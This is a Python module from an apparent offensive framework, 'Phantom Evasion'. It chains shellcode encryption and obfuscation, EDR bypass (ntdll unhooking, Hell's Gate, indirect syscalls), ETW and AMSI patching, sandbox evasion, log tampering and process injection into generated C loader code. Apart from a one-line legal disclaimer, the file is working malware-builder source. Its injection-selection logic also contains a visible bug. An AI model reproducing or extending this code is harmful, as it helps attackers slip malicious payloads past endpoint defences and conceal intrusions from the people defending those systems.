"""
Phantom Evasion - Obfuscation Orchestrator

LEGAL DISCLAIMER:
For authorized penetration testing and security research ONLY.
Users must have explicit written permission from the target system owner.
"""

import random
from typing import Dict, Any, List


class Obfuscator:
    """Orchestrate all evasion techniques across four defensive layers."""

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def apply_layer1(self, shellcode: bytes, encryption: str = "aes") -> Dict[str, Any]:
        """Layer 1: Static evasion – encryption + code obfuscation.

        Args:
            shellcode: Raw shellcode bytes to encrypt.
            encryption: Encryption scheme (``xor`` | ``aes`` | ``rc4`` | ``chacha20``).

        Returns:
            Dict with keys ``code``, ``description``, ``layer``, ``name``,
            ``encrypted_shellcode``, and optional scheme-specific keys.
        """
        scheme = encryption.lower()
        if scheme == "xor":
            from techniques.encryption.xor_encrypt import generate_xor_encryption
            result = generate_xor_encryption(shellcode)
        elif scheme == "aes":
            from techniques.encryption.aes_encrypt import generate_aes_encryption
            result = generate_aes_encryption(shellcode)
        elif scheme == "rc4":
            from techniques.encryption.rc4_encrypt import generate_rc4_encryption
            result = generate_rc4_encryption(shellcode)
        elif scheme == "chacha20":
            from techniques.encryption.chacha20_encrypt import generate_chacha20_encryption
            result = generate_chacha20_encryption(shellcode)
        else:
            raise ValueError(f"Unknown encryption scheme: {encryption!r}")

        # Append obfuscation code snippets
        from techniques.obfuscation.string_obfuscate import generate_string_obfuscation
        from techniques.obfuscation.junk_code import generate_junk_code
        from techniques.obfuscation.polymorphic import generate_polymorphic_code
        from techniques.obfuscation.control_flow_flatten import generate_control_flow_flattening

        obf_parts: List[str] = [
            result.get("code", ""),
            generate_string_obfuscation()["code"],
            generate_junk_code()["code"],
            generate_polymorphic_code()["code"],
            generate_control_flow_flattening()["code"],
        ]
        result["code"] = "\n".join(obf_parts)
        result["description"] = (
            f"{result.get('description', '')}; string obfuscation; junk code; "
            "polymorphic vars; control flow flattening"
        )
        return result

    def apply_layer2(self, edr_bypass_level: str = "full") -> Dict[str, Any]:
        """Layer 2: EDR bypass – syscalls, unhooking, API hashing.

        Args:
            edr_bypass_level: ``none`` | ``basic`` | ``full``

        Returns:
            Dict with combined C code and metadata.
        """
        if edr_bypass_level == "none":
            return {"code": "", "description": "No EDR bypass", "layer": "Layer 2 - EDR Bypass", "name": "none"}

        from techniques.edr_bypass.api_hashing import generate_api_hashing

        parts: List[str] = [generate_api_hashing()["code"]]
        desc_parts: List[str] = ["api_hashing"]

        if edr_bypass_level in ("basic", "full"):
            from techniques.edr_bypass.direct_syscalls import generate_direct_syscalls
            from techniques.edr_bypass.unhook_ntdll import generate_unhook_ntdll
            parts += [
                generate_direct_syscalls()["code"],
                generate_unhook_ntdll()["code"],
            ]
            desc_parts += ["direct_syscalls", "unhook_ntdll"]

        if edr_bypass_level == "full":
            from techniques.edr_bypass.indirect_syscalls import generate_indirect_syscalls
            from techniques.edr_bypass.hells_gate import generate_hells_gate
            parts += [
                generate_indirect_syscalls()["code"],
                generate_hells_gate()["code"],
            ]
            desc_parts += ["indirect_syscalls", "hells_gate"]

        return {
            "code": "\n".join(parts),
            "description": "; ".join(desc_parts),
            "layer": "Layer 2 - EDR Bypass",
            "name": "edr_bypass",
        }

    def apply_layer3(self) -> Dict[str, Any]:
        """Layer 3: ETW/AMSI bypass.

        Returns:
            Dict with combined C code and metadata.
        """
        from techniques.etw_bypass.patch_etw import generate_etw_patch
        from techniques.etw_bypass.patch_amsi import generate_amsi_patch

        etw = generate_etw_patch()
        amsi = generate_amsi_patch()

        return {
            "code": "\n".join([etw["code"], amsi["code"]]),
            "description": "patch_etw; patch_amsi",
            "layer": "Layer 3 - ETW/AMSI Bypass",
            "name": "etw_amsi_bypass",
        }

    def apply_layer4(self, injection_method: str = "classic") -> Dict[str, Any]:
        """Layer 4: Behavioral evasion – sandbox checks + injection.

        Args:
            injection_method: ``classic`` | ``apc`` | ``early_bird`` | ``callback``

        Returns:
            Dict with combined C code and metadata.
        """
        from techniques.sandbox_evasion.sleep_encrypt import generate_sleep_encrypt
        from techniques.sandbox_evasion.env_checks import generate_env_checks
        from techniques.sandbox_evasion.parent_spoof import generate_parent_spoof
        from techniques.sandbox_evasion.delayed_exec import generate_delayed_exec
        from techniques.xdr_evasion.process_masquerade import generate_process_masquerade
        from techniques.xdr_evasion.network_evasion import generate_network_evasion
        from techniques.xdr_evasion.log_tampering import generate_log_tampering

        sandbox_parts = [
            generate_sleep_encrypt()["code"],
            generate_env_checks()["code"],
            generate_parent_spoof()["code"],
            generate_delayed_exec()["code"],
            generate_process_masquerade()["code"],
            generate_network_evasion()["code"],
            generate_log_tampering()["code"],
        ]

        # Select injection technique
        method = injection_method.lower()
        if method == "apc":
            from techniques.injection.apc_injection import generate_apc_injection
            inj = generate_apc_injection()
        elif method == "early_bird":
            from techniques.injection.early_bird import generate_early_bird_injection
            inj = generate_early_bird_injection()
        elif method == "callback":
            from techniques.injection.callback_injection import generate_callback_injection
            inj = generate_callback_injection()
        else:
            from techniques.injection.classic_injection import generate_classic_injection
            inj = generate_classic_injection()

        return {
            "code": "\n".join(sandbox_parts),
            "injection_code": inj["code"],
            "description": (
                "sleep_encrypt; env_checks; parent_spoof; delayed_exec; "
                "process_masquerade; network_evasion; log_tampering; "
                f"injection={method}"
            ),
            "layer": "Layer 4 - Behavioral Evasion",
            "name": "behavioral_evasion",
        }

    def apply_all_layers(self, shellcode: bytes, config: Dict[str, Any]) -> Dict[str, Any]:
        """Apply all four layers and return a combined result dict.

        The returned dict has keys:
            - ``encryption_code``  – Layer 1 C code
            - ``edr_code``         – Layer 2 C code
            - ``etw_code``         – Layer 3 C code
            - ``behavioral_code``  – Layer 4 sandbox/XDR C code
            - ``injection_code``   – Layer 4 injection C code
            - ``description``      – Human-readable summary of applied techniques

        Args:
            shellcode: Raw shellcode bytes.
            config:    Pipeline configuration dict (from CLI / config.yaml).
        """
        encryption = config.get("encryption", "aes")
        edr_bypass = config.get("edr_bypass", "full")

        # "techniques" may be a list/tuple of extra technique names (from CLI)
        # or a dict (from config.yaml). Extract the injection method accordingly.
        raw_techs = config.get("techniques")
        if isinstance(raw_techs, (list, tuple)) and raw_techs:
            injection_method = raw_techs[0]
        else:
            injection_method = "classic"

        l1 = self.apply_layer1(shellcode, encryption)
        l2 = self.apply_layer2(edr_bypass)
        l3 = self.apply_layer3()
        l4 = self.apply_layer4(injection_method)

        description = " | ".join(filter(None, [
            l1.get("description"),
            l2.get("description"),
            l3.get("description"),
            l4.get("description"),
        ]))

        # Generate main logic for WinMain
        # This orchestrates all applied evasion layers in the correct order.
        main_logic = """
    // --- Layer 2: EDR Bypass Initialization ---
    unhook_ntdll();

    // Resolve Syscall Service Numbers (SSNs) via Hell's Gate
    ssn_NtAllocateVirtualMemory = hells_gate_resolve("NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = hells_gate_resolve("NtWriteVirtualMemory");
    ssn_NtProtectVirtualMemory  = hells_gate_resolve("NtProtectVirtualMemory");
    ssn_NtCreateThreadEx        = hells_gate_resolve("NtCreateThreadEx");

    // Initialize Indirect Syscalls
    g_syscall_gadget = find_syscall_gadget();

    // --- Layer 3: ETW/AMSI Bypass ---
    patch_etw_event_write();
    patch_amsi_scan_buffer();

    // --- Layer 4: Behavioral Evasion / Sandbox Checks ---
    if (is_sandbox()) {
        // Exit silently if sandbox/VM detected
        return 0;
    }

    // Delayed Execution PoC (silent sleep)
    // delayed_execution(5); 

    // --- Layer 1: Static Evasion (Decryption) ---
"""
        enc_name = l1.get("name", "aes_encrypt")
        inj_name = l4.get("name", "classic_injection")

        if "aes" in enc_name:
            main_logic += """
    unsigned char *dec_sc = NULL;
    DWORD dec_sc_len = 0;
    if (aes_decrypt(encrypted_shellcode, shellcode_enc_len, aes_key, aes_iv, &dec_sc, &dec_sc_len)) {
"""
        elif "xor" in enc_name:
             main_logic += """
    unsigned char *dec_sc = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, shellcode_len);
    memcpy(dec_sc, encrypted_shellcode, shellcode_len);
    xor_decrypt(dec_sc, shellcode_len, xor_key, xor_key_len);
    DWORD dec_sc_len = shellcode_len;
    {
"""
        else:
             main_logic += "    /* No decryption logic generated for this scheme */\n    {\n"

        # Add injection call
        if "classic" in inj_name:
            main_logic += "        classic_inject(GetCurrentProcessId(), dec_sc, dec_sc_len);\n"
        elif "apc" in inj_name:
            main_logic += "        apc_inject(GetCurrentProcessId(), dec_sc, dec_sc_len);\n"
        elif "callback" in inj_name:
            main_logic += "        callback_execute(dec_sc, dec_sc_len);\n"
        else:
            main_logic += "        /* Unknown injection technique call */\n"

        main_logic += "        if (dec_sc) HeapFree(GetProcessHeap(), 0, dec_sc);\n    }\n"

        return {
            "encryption_code": l1.get("code", ""),
            "edr_code": l2.get("code", ""),
            "etw_code": l3.get("code", ""),
            "behavioral_code": l4.get("code", ""),
            "injection_code": l4.get("injection_code", ""),
            "main_logic": main_logic,
            "description": description,
        }
